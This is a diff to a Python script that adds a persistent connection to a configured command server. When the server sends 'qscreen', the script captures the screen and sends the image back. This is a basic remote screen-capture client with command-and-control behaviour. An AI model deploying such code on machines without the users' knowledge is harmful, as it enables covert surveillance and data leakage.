@@ -99,9 +99,35 @@ def sendImage(img):
             sock.sendall(data)
 
 
-screenshot('test1')
-sendImage(imagesToSend.pop())
-screenshot('test2')
-sendImage(imagesToSend.pop())
-screenshot('test3')
-sendImage(imagesToSend.pop())
+def quickScreenshot(comment='QuickScreenshot'):
+    screenshot(comment)
+    sendImage(imagesToSend.pop())
+
+S = socket.socket()
+def reconnect():
+    global S
+    try: S.close();S=socket.socket()
+    except:pass
+    ip = cfg['sockServerCmd'].split(':')
+    port = int(ip[1]);
+    ip = ip[0]
+    S.connect((ip, port))
+    post('info', '+CON', 'Connected to cmd server',3)
+reconnect()
+
+def listen():
+    global S
+    while True:
+        try:
+            data = S.recv(cfg['cacheSize']).decode('utf-8').lower()
+            data=data.split('-')
+            if data[0]=='qscreen':
+                quickScreenshot(' '.join(data[1:]))
+
+        except ConnectionResetError:
+            post('info','-CON','Lost connection to server', 3)
+            reconnect()
+        except Exception as e:
+            post('info','Exception@listen',str(e))
+#threadrun(listen)
+listen()
